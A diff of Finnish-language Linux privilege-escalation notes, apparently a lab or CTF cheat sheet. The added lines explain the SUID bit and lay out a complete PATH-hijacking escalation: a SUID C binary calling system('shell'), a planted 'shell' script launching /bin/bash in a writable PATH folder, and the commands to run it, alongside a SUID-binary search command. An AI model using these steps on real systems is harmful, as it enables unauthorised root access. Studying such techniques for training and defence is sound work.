@@ -43,6 +43,7 @@ Jos löytyy jotain, täältä hyväksikäyttötavat:
 https://gtfobins.github.io/
 
 **SUID-haavoittuvuudet**
+SUID -bitti suorittaa ohjelman aina ohjelman omistajan oikeuksilla, riippumatta ajajasta.
 Ohjelmat, joissa SUID-bitti asetettu:
 ```bash
 find / -type f -perm -04000 -ls 2>/dev/null
@@ -63,7 +64,7 @@ Kansion lisääminen PATH-muuttujaan:
 ```bash
 export PATH=/tmp:$PATH
 ```
-Ohjelma etsii PATH-kansioista "shell" -nimistä ohjelmaa:
+Alla oleva ohjelma "suid_exploit" etsii PATH-kansioista "shell" -nimistä ohjelmaa:
 
 ```c
 #include<unistd.h>
@@ -73,7 +74,17 @@ void main()
   system("shell");
 }
 ```
+Compile ja aseta SUID-bitti
 ```bash
-gcc koodi.c -o koodi -w
+gcc suid_exploit.c -o suid_exploit -w
+chmod u+s suid_exploit
 ```
---Lisää ohje SUID-bitistä ym.--
+Shell-scripti lisätään PATH-muuttujasta löytyvään kansioon, johon käyttäjällä on kirjoitusoikeudet:
+```bash
+echo "/bin/bash" > shell
+chmod 777 shell
+```
+Lopuksi ajetaan suid_exploit:
+```bash
+./suid_exploit
+```
